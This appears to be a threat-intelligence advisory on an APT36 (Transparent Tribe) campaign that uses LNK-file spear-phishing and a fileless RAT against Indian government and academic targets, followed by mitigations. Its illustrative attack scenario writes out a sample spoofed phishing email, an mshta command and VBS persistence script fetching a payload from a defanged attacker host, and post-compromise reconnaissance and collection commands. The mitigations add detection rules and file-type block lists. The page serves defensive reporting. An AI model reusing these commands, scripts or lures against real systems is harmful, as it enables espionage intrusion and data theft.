# Transparent Tribe RAT Campaign Targeting Indian Government and Academia

**APT36**{.cve-chip} **Transparent Tribe**{.cve-chip} **RAT**{.cve-chip} **Spear-Phishing**{.cve-chip} **Fileless Malware**{.cve-chip} **India**{.cve-chip}

## Overview

**Transparent Tribe (APT36)**, a Pakistan-attributed advanced persistent threat group, has launched a **sophisticated cyber-espionage campaign** targeting **Indian government entities and academic institutions** using a **multi-stage remote access trojan (RAT)** delivered through **weaponized Windows shortcut (LNK) files**. 

The campaign employs **spear-phishing emails** containing ZIP archives with malicious LNK files disguised as legitimate PDF documents. When victims open these files, a **fileless execution chain** is triggered via `mshta.exe`, loading an HTA script that decrypts and executes the RAT payload **entirely in memory** without writing the primary malware to disk, evading traditional antivirus detection. The RAT, implemented as a DLL named `iinneldc.dll`, provides attackers with **comprehensive remote system control** including file manipulation, process execution, screenshot capture, clipboard monitoring, and arbitrary command execution via encrypted HTTP command-and-control (C2) channels. 

The malware demonstrates **adaptive persistence mechanisms** that vary based on detected antivirus products (Kaspersky, Quick Heal, Avast/AVG/Avira), using different registry keys and startup methods to maintain access. 

The campaign represents a continuation of **APT36's long-standing targeting of Indian strategic sectors**, with particular focus on **government ministries, defense organizations, research institutions, and educational establishments**. The use of fileless techniques, memory-resident execution, and AV-aware persistence reflects the group's **evolving tradecraft** to evade modern detection technologies. Transparent Tribe, also tracked as **Mythic Leopard** and **TEMP.Lapis**, has been active since at least 2013 and is known for cyber-espionage operations aligned with Pakistani geopolitical interests.

---

## Campaign Specifications

| **Attribute**              | **Details**                                                                 |
|----------------------------|-----------------------------------------------------------------------------|
| **Threat Actor**           | Transparent Tribe (APT36, Mythic Leopard, TEMP.Lapis)                      |
| **Attribution**            | Pakistan (state-sponsored/aligned)                                         |
| **Campaign Type**          | Cyber-espionage, targeted intrusion                                        |
| **Target Geography**       | India                                                                      |
| **Target Sectors**         | Government (central/state ministries), Defense, Academia, Research         |
| **Attack Vector**          | Spear-phishing emails with malicious ZIP attachments                       |
| **Initial Access**         | Malicious LNK file disguised as PDF document                               |
| **Execution Method**       | Fileless (memory-resident), in-memory decryption and loading               |
| **Payload Type**           | Remote Access Trojan (RAT)                                                 |
| **Malware Name**           | iinneldc.dll                                                               |
| **Execution Tool**         | mshta.exe (Microsoft HTML Application Host)                                |
| **Script Type**            | HTA (HTML Application)                                                     |
| **Delivery Format**        | ZIP archive containing LNK file                                            |
| **Decoy Document**         | Legitimate-looking PDF opened post-infection to avoid suspicion            |
| **Persistence Mechanism**  | Adaptive (varies by detected AV product)                                   |
| **AV Products Detected**   | Kaspersky, Quick Heal, Avast, AVG, Avira                                   |
| **C2 Protocol**            | Encrypted HTTP                                                             |
| **C2 Obfuscation**         | Reversed strings, encoding                                                 |

---

## Attack Scenario

### Step-by-Step Campaign

1. **Target Selection and Reconnaissance**  
   APT36 identifies high-value targets in Indian government and academic sectors:
    - **OSINT Collection**: LinkedIn, government websites, academic publications to identify officials, researchers, department heads
    - **Email Harvesting**: Collect official email addresses from public sources
    - **Context Research**: Identify current policy initiatives, research projects, ongoing events for credible lures
   
    Target identified: Director of Strategic Research at Indian defense think tank, email: `director.research@strategic-studies.in`

2. **Spear-Phishing Email Crafted**  
   Attacker creates highly targeted phishing email:
   ```
   From: joint.secretary@mea.gov[.]in (spoofed legitimate ministry domain)
   To: director.research@strategic-studies.in
   Subject: CONFIDENTIAL: Strategic Partnership Framework - Immediate Review Required
   
   Dear Director,
   
   As per the recent high-level meeting, please review the attached framework
   document for the new strategic partnership initiative. Your inputs are
   required before the next steering committee meeting on January 15.
   
   This document contains sensitive information. Please handle accordingly.
   
   Attachment: Strategic_Framework_Confidential_Jan2026.zip
   
   Regards,
   Joint Secretary (Strategic Affairs)
   Ministry of External Affairs
   Government of India
   ```
   
    Email crafted to appear urgent, authoritative, and relevant to recipient's role.

3. **Victim Opens Malicious ZIP**  
   Target receives email, verifies sender appears legitimate (spoofed government domain), opens ZIP attachment. Inside ZIP: `Strategic_Framework_Confidential_Jan2026.lnk` with PDF icon. Victim believes this is a document and double-clicks to open.

4. **LNK File Executes mshta.exe**  
   Windows shell processes LNK file:
   ```
   Execution: C:\Windows\System32\mshta.exe hxxp://update-services[.]info/doc/framework.hta
   ```
   
    `mshta.exe` (legitimate Microsoft binary) fetches HTA script from attacker-controlled server. No security warnings displayed (signed Microsoft executable, HTTP traffic allowed by default).

5. **HTA Script Runs, Deploys RAT**  
   HTA script executes in `mshta.exe` context:
      - Downloads encrypted RAT DLL from C2 server
      - Decrypts DLL in memory using XOR with embedded key
      - Performs **reflective DLL injection** into `mshta.exe` memory space
      - Loads `iinneldc.dll` without writing to disk
      - Opens decoy PDF (legitimate strategic partnership document stolen from previous compromise or publicly available policy paper)

      Victim sees PDF open successfully, believes document accessed normally. No indication of compromise.

6. **Persistence Established**  
      RAT enumerates system for installed antivirus:
      ```
      Check: C:\Program Files\Quick Heal\
      Result: Quick Heal Total Security detected
      ```

      RAT implements Quick Heal-specific persistence:
      ```
      Creates Scheduled Task:
      Name: MicrosoftEdgeUpdateTaskMachine (mimics legitimate task)
      Trigger: At log on of any user
      Action: wscript.exe //B "%APPDATA%\Microsoft\Windows\Templates\security.vbs"
      ```

      VBS script content (obfuscated):
      ```vbscript
      Set objShell = CreateObject("WScript.Shell")
      objShell.Run "mshta.exe hxxp://update-services[.]info/doc/framework.hta", 0
      ```

      Scheduled task runs hidden script on every logon, re-downloading and re-injecting RAT.

7. **C2 Communication Established**  
    - RAT initiates beacon to command-and-control server
    - C2 server responds with bot ID and initial tasking. 
    - RAT begins command polling loop (every 60 seconds).

8. **Initial Reconnaissance**  
   Attacker issues reconnaissance commands via C2:
   ```
   Command 1: systeminfo
   Command 2: whoami /all
   Command 3: net user
   Command 4: ipconfig /all
   Command 5: dir C:\Users\director\Desktop /s
   ```
   
    RAT executes commands, sends results to C2. Attacker identifies:
    - System is domain-joined (strategic-studies.local)
    - User has administrative privileges
    - Desktop contains folders: "Ministry Briefings", "Defense Analysis", "Classified"

9. **Data Exfiltration**  
   Attacker commands RAT to exfiltrate sensitive documents:
   ```
   Command: collect_docs C:\Users\director\Desktop\Classified *.pdf,*.docx
   ```
   
    RAT searches directory tree, finds files:
    - `Indo-Pacific_Strategic_Assessment_2026.docx`
    - `Defense_Procurement_Plans_Confidential.pdf`
    - `Cyber_Threat_Landscape_Internal.pdf`
    - `Border_Security_Analysis.docx`

    Files compressed, encrypted, uploaded to C2 via POST requests. Exfiltrated data includes classified strategic assessments, defense planning documents, threat intelligence reports.

10. **Long-Term Surveillance and Lateral Movement**  
    RAT remains active for weeks/months:
    - **Keylogging**: Captures credentials for internal portals, email, VPN
    - **Screenshot Monitoring**: Periodic screenshots during work hours
    - **Clipboard Theft**: Copies sensitive data pasted in documents
    - **Credential Harvesting**: Steals credentials stored in browser, Windows Credential Manager
    
    Attacker uses harvested credentials to:

      - Access internal SharePoint sites with classified research
      - Compromise additional researcher accounts via credential reuse
      - Gain VPN access to institutional network
      - Deploy additional malware on network file servers for persistent access

---

## Impact Assessment

=== "Confidentiality"
    Massive compromise of sensitive government and academic information:

    - **Classified Documents**: Strategic assessments, defense planning, intelligence reports, policy drafts stolen from government ministries and defense research organizations
    - **Research Data**: Academic research on sensitive topics (defense technology, cyber security, geopolitical analysis) exfiltrated
    - **Credentials**: Government official credentials, institutional access credentials, VPN credentials harvested
    - **Communications**: Email surveillance reveals inter-agency communications, government-academia collaborations, sensitive discussions
    - **Strategic Intelligence**: Adversary (Pakistan) gains insight into India's strategic planning, defense posture, research priorities, policy directions
    - **National Security Impact**: Compromised intelligence affects India's strategic decision-making, negotiating positions, defense preparedness
    
    Confidentiality breach at highest levels of sensitivity, affecting national security interests.

=== "Integrity" 
    Potential for data manipulation and misinformation:

    - **Document Tampering**: Attackers could modify documents before exfiltration or plant false information in systems
    - **Research Manipulation**: Academic research data could be altered, undermining scientific integrity
    - **Policy Influence**: Stolen insights into policy development could inform adversary's counter-strategies
    - **Credential Abuse**: Compromised credentials may be used to plant false information, alter research findings, or submit fraudulent documents
    - **Trust Erosion**: Discovery of breach undermines trust in government-academia information sharing
    
    While primary goal is espionage (confidentiality), integrity risks exist for influence operations.

=== "Availability"
    Limited direct availability impact, but incident response causes disruption:

    - **System Quarantine**: Compromised systems must be taken offline for investigation and remediation
    - **Network Segmentation**: Emergency network isolation disrupts normal operations
    - **Incident Response**: Forensics, malware removal, credential resets consume significant resources
    - **Operational Disruption**: Research projects, policy development slowed during investigation
    - **Collaboration Freeze**: Inter-agency and international collaborations may be suspended pending security review
    
    Availability impact primarily from defensive response rather than attacker actions.

=== "Scope"
    Compromise extends beyond individual victims to national interests:

    - **Government-Wide**: Multiple ministries potentially affected (External Affairs, Defense, Home Affairs, others)
    - **Defense Sector**: Defense research organizations, military academies, strategic think tanks targeted
    - **Academic Sector**: Universities conducting sensitive research compromised
    - **Inter-Agency Impact**: Compromise of one entity affects all agencies sharing information
    - **International Relations**: Stolen intelligence on partnerships, negotiations affects India's diplomatic standing
    - **Geopolitical**: Information advantage gained by adversary state (Pakistan) in regional power dynamics
    
    Campaign represents strategic-level threat to India's national security posture.

---

## Mitigation Strategies

### Email and Phishing Defenses

- **Advanced Email Security**: Deploy email security solutions with:
    - **Attachment Sandboxing**: Detonate LNK, ZIP, Office files in isolated environment before delivery
    - **URL Rewriting**: Rewrite URLs in emails to proxy through security gateway
    - **DMARC Enforcement**: Configure `p=reject` for government domains to prevent spoofing
    - **Sender Verification**: Validate sender authenticity via DKIM, SPF, organizational directory lookups

- **Attachment Filtering**: Block or quarantine high-risk file types:
  ```
  Block at Email Gateway:
  - .lnk (Windows Shortcut)
  - .hta (HTML Application)
  - .scr (Screen Saver)
  - .pif (Program Information File)
  - .cmd, .bat (Batch files)
  - Nested archives (ZIP within ZIP)
  ```
  
    Allow only approved file types for external senders (PDF, Office documents scanned for malware).

- **User Training**: Comprehensive security awareness:
    - **Phishing Simulations**: Regular simulated phishing campaigns mimicking APT36 tactics
    - **LNK File Recognition**: Train users to identify shortcut files (arrow icon overlay, .lnk extension if visible)
    - **Verification Protocols**: Establish procedures for verifying unexpected document requests via phone/in-person
    - **Reporting Mechanisms**: Easy-to-use suspicious email reporting button in email client

### Endpoint Protection

- **Endpoint Detection and Response (EDR)**: Deploy modern EDR solutions:
    - **Behavioral Analysis**: Detect fileless execution patterns (mshta.exe with network connections, memory injections)
    - **Memory Scanning**: Scan process memory for malicious code (catches in-memory RAT loading)
    - **AMSI Integration**: Use Antimalware Scan Interface to inspect PowerShell/VBScript at runtime
    - **IOC Matching**: Automatically block known APT36 indicators (file hashes, C2 domains, registry keys)

- **Application Whitelisting**: Restrict executable binaries:
  ```
  Allow List Approach:
  - Only approved applications can execute
  - Restrict mshta.exe execution (or block entirely if not business-critical)
  - Disable Windows Script Host (wscript.exe, cscript.exe) if not required
  - Use AppLocker or Windows Defender Application Control (WDAC)
  ```

### Network Security

- **C2 Domain Blocking**: Block known APT36 infrastructure:
    - Obtain IOCs from CYFIRMA, threat intelligence feeds
    - Block at firewall, DNS, proxy levels
    - Use threat intelligence feeds (AlienVault OTX, ThreatConnect, MISP)

- **Network Segmentation**: Isolate sensitive systems:
  ```
  Segment 1: Government Ministry Workstations (restricted internet)
  Segment 2: Research Networks (academic institutions)
  Segment 3: DMZ (internet-facing services)
  
  Firewall Rules:
  - Segment 1 → Internet: Block outbound HTTP/HTTPS except to approved destinations (gov portals, approved services)
  - Segment 2 → Segment 1: Deny (prevent lateral movement)
  - Monitor east-west traffic for anomalies
  ```

- **DNS Monitoring**: Detect C2 communication:
    - Monitor DNS queries for newly registered domains (APT36 often uses fresh domains)
    - Alert on DNS queries to suspicious TLDs (.info, .top, .xyz commonly used by APT groups)
    - Use DNS sinkholing for known malicious domains

- **SSL/TLS Inspection**: Decrypt outbound HTTPS:
    - Deploy SSL inspection at network egress
    - Inspect encrypted C2 traffic for malicious payloads
    - Note: Requires careful implementation to avoid breaking legitimate HTTPS (pinning, certificate validation)

### Detection and Monitoring

- **SIEM Integration**: Centralize security logs:
    - **Endpoint Logs**: Process creation, file creation, registry modifications, network connections
    - **Network Logs**: Firewall, proxy, DNS, IDS/IPS
    - **Email Logs**: Email gateway logs (attachments, senders, recipients)
  
  **Correlation Rules**:

  - Alert on `mshta.exe` execution followed by network connection
  - Alert on LNK file execution from user directories
  - Alert on memory-only DLL loading (via Sysmon Event ID 7 with no corresponding disk file)

- **Behavioral Indicators**: Hunt for suspicious activity:
  - `mshta.exe` with network connections
  - Scheduled tasks with random names created by non-admin users
  - Registry Run keys with PowerShell/script content
  - WMI event subscriptions created by user processes
  - Clipboard monitoring activity (via Windows Clipboard API calls)

---

## Resources

!!! info "Threat Intelligence"
    - [Transparent Tribe Launches New RAT Attacks Against Indian Government and Academia](https://thehackernews.com/2026/01/transparent-tribe-launches-new-rat.html)
    - [Transparent Tribe APT36: Weaponized Shortcuts and Adaptive Persistence Target Indian Government Entities — Cyberwarzone](https://cyberwarzone.com/2026/01/04/transparent-tribe-apt36-weaponized-shortcuts-and-adaptive-persistence-target-indian-government-entities/)
    - [New RAT Attacks Against the Indian Government and Academic Institutions by Transparent Tribe or APT36](https://www.news4hackers.com/new-rat-attacks-against-the-indian-government-and-academic-institutions-by-transparent-tribe-or-apt36/)
    - [APT36 Targets Indian Government Systems Using Malicious Windows LNK Files](https://cyberpress.org/apt36-cyber-attack/)
    - [APT36 Malware Campaign Targeting Windows LNK Files to Attack Indian Government Entities](https://cybersecuritynews.com/apt36-malware-campaign-targeting-windows-lnk-files/)
    
---

*Last Updated: January 4, 2026*
